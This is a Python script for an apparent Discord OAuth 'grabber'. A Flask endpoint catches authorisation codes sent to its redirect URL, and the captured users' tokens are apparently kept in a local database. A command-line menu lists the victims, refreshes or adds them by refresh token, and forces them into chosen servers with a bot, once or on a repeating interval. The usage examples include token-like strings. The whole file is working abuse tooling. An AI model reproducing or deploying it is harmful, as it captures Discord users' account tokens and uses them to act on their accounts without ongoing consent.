import requests
import os.path
import socket
import logging
import time
from configparser import ConfigParser
from flask import Flask, render_template, request
from threading import Thread, Event
import oauth as worker
app = Flask(__name__)
flasLogger = logging.getLogger('werkzeug')
flasLogger.setLevel(logging.ERROR)
config = ConfigParser()
configPath = 'resources/config.ini'
dbPath = 'resources/db.json'

Threads = []
Intervals = []

try:    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    LOCAL_IP = s.getsockname()[0]
    EXTERNAL_IP = requests.get('https://api.ipify.org').content.decode('utf8')
    s.close()
except Exception as err:
    print('Error while getting ips! Exiting! Error: ', err)
    print('Error while getting ips! Check your internet connection! Exiting!')
    exit()

if(os.path.exists(configPath)):
    print('config file exist')
    config.read(configPath)
else:
    print('config file doesn\'t exist! creating, you have to enter some values!')
    a = input("Discord client id: ")
    b = input("Discord client secret: ")
    g = input("Discord bot token: ")
    while(True):
        c = input("Discord api url(https://discord.com/api/v10): ")
        if(c == ''):
            c = 'https://discord.com/api/v10'
            break
        if(c.startswith("https://discord.com/api/")):
            break
        else:
            print('incorrect url')
    while(True):
        d = input("Port(3000) 1024-32766: ")
        if(d == ''):
            d = 3000
        try:
            ret = int(d)
            if(ret>=1024 and ret<=32767):
                break
            else:
                print("incorrect port number! pls enter number in 1024-32766")
        except ValueError:
            print('You have not entered a number!')
    while(True):
        e = input('redirect url *generated exactly for you*(%s): ' % 'http://%s:' % EXTERNAL_IP)
        if(e == ''):
            e = 'http://%s:' % EXTERNAL_IP
            break
        if(e.startswith('http')):
            break
        else:
            print('incorrect url! please enter http(https) url!')
    while(True):
        f = input("Url path(/api/auth/discord/redirect): ")
        if(f == ''):
            f = "/api/auth/discord/redirect"
            break
        if(f == '/'):
            print('incorrect path! must be more then just "/"')
        elif(f.startswith('/')):
            break
        else:
            print('incorrect path! must start with /')
    
    config['discord'] = {'client_id': a,
                         'client_secret': b,
                         'api': c,
                         'bot_token': g}
    config['grabber'] = {'port': d,
                         'redirect_uri': e,
                         'grabber_url_args': f}
    print('Your redirect url:"%s"' % (str(e)+str(d)+str(f)))
    print('writing config file in %s' % configPath)
    with open(configPath, 'w') as conf:
        config.write(conf)
        print('writed config file in %s' % configPath)

API_ENDPOINT = config['discord']['api']
CLIENT_ID = config['discord']['client_id']
CLIENT_SECRET = config['discord']['client_secret']
BOT_TOKEN = config['discord']['bot_token']
PORT = config['grabber']['port']
URL_ARGS = config['grabber']['grabber_url_args']
REDIRECT_URI = config['grabber']['redirect_uri'] + PORT + URL_ARGS

worker.API_ENDPOINT = API_ENDPOINT
worker.CLIENT_ID = CLIENT_ID
worker.CLIENT_SECRET = CLIENT_SECRET
worker.REDIRECT_URI = REDIRECT_URI

@app.route("/")
def home():
    return render_template('home.html')

@app.route(URL_ARGS)
async def login():
    if (request.args.__contains__('code')):
        code = request.args['code']
        i = Threads.__len__()
        Threads.append(Thread(target=worker.Code_catch, args=(code, i,), daemon=True))
        Threads[i].start()
        return 'hi!'

def web():
    app.run(debug = False, port=PORT,host=LOCAL_IP)

def JoinInterval(bot_token, guild_ids, user_ids, timeToSleep, event):
    print('started infinity join!')
    timeToSleep = float(int(timeToSleep))
    if(timeToSleep < 10):
        timeToSleep = 10
    while(True):
        a = 0
        while a < timeToSleep:
            time.sleep(1.0)
            a += 1
            if event.is_set():
                print('stoped infinity join!')
                return
        worker.Joiner(bot_token,guild_ids,user_ids)
    

Threads.append(Thread(target=web, args={}, daemon=True))
Threads[0].start()

interval = Event()
#CLI
time.sleep(1.0)
while(True):
    try:
        command = input('~: ')
        cwa = command.split(' ')
    except KeyboardInterrupt:
        print('Bye see you next time :)')
        exit()
    except Exception as err:
        print('error in CLI module!!!! exiting', err)
        exit()
    cmd = cwa[0]
    match(cmd):
        case 'help':
            print('Command list:\n\thelp - show this list\n\texamples - show examples for all commands\n\tdebug - control theards debug\n\toutput - control functions output\n\tusers - shows users\n\tbyName <username> - get user from db by username!\n\tbyId <user_id> - get user from db by id!\n\tupdate <user_id> - update info and tokens of user\n\tjoinGuild <user_id> <server_id> - add user from db to a server with bot!\n\tinfJoin <user_id> <server_id> <interval_time> - add user from db to a server with bot every interval_time seconds(min 10 seconds)\n\tstopInf - stoping all working infJoin instances\n\tadd <refresh_token> - add new user to db by refresh token')
        case 'debug':
            if(cwa.__len__() == 1):
                if(worker.debug):
                    print('Debug is turned off')
                else:
                    print('Debug is turned on')
                worker.debug = not worker.debug
            else:
                print('Incorrect args amount! Use "help"')
        case 'output':
            if(cwa.__len__() == 1):
                if(worker.output):
                    print('Outut is turned off')
                else:
                    print('Output is turned on')
                worker.output = not worker.output
            else:
                print('Incorrect args amount! Use "help"')
        case 'users':
            if(cwa.__len__() == 1):
                worker.GetUsers()
            else:
                print('Incorrect args amount!')
        case 'byName':
            if(cwa.__len__() == 2):
                worker.dbWorker.show(worker.dbWorker.getByName(cwa[1]))
            else:
                print('Incorrect args amount!')
        case 'byId':
            if(cwa.__len__() == 2):
                worker.dbWorker.show(worker.dbWorker.getById(cwa[1]))
            else:
                print('Incorrect args amount!')
        case 'update':
            if(cwa.__len__() == 2):
                worker.Update(cwa[1])
            else:
                print('Incorrect args amount!')
        case 'joinGuild':
            if(cwa.__len__() == 3):
                worker.Joiner(BOT_TOKEN, cwa[2], cwa[1])
            else:
                print('Incorrect args amount!')
        case 'infJoin':
            if(cwa.__len__() == 4):
                interval = Event()
                i = Threads.__len__()
                Threads.append(Thread(target=JoinInterval,args=(BOT_TOKEN,cwa[2],cwa[1],cwa[3], interval),daemon=True))
                Threads[i].start()
            else:
                print('Incorrect args amount!')
        case 'add':
            if(cwa.__len__() == 2):
                worker.Add(cwa[1], 0)
            else:
                print('Incorrect args amount! Use "help"')
        case 'stopInf':
            if(cwa.__len__() == 1):
                interval.set()
            else:
                print('Incorrect args amount! Use "help"')
        case 'examples':
            print('Examples:\n\tdebug:\n\t debug\n\toutput:\n\t output\n\tusers:\n\t users\n\tbyName:\n\t byName possiug\n\tbyId:\n\t byId 1100792963157737602\n\tupdate:\n\t update 1100792963157737602\n\t update -1\n\t update 1161570973993156620,1078923883899535420\n\tjoinGuild:\n\t joinGuild 1100792963157737602 1161570973993156620\n\t joinGuild 1161570973993156620,1078923883899535420 1161570973993156620,1145744998453743706\n\t joinGuild -1 1161570973993156620,1145744998453743706\n\tinfJoin:\n\t infJoin 1100792963157737602 1161570973993156620 10\n\t infJoin 1161570973993156620,1078923883899535420 1161570973993156620,1145744998453743706 10\n\t infJoin -1 1161570973993156620,1145744998453743706 0\n\tstopInf:\n\t stopInf\n\tadd:\n\t add r6CR0RbIJuJI2c0P7JB1VGtCW5WvrJ\n\t add r6CR0RbIJuJI2c0P7JB1VGtCW5WvrJ,OkL80QmDDUKZiPgsxw3bWaeqs0BwuW')
        case _:
            print('Command not found! use "help" for list of commands')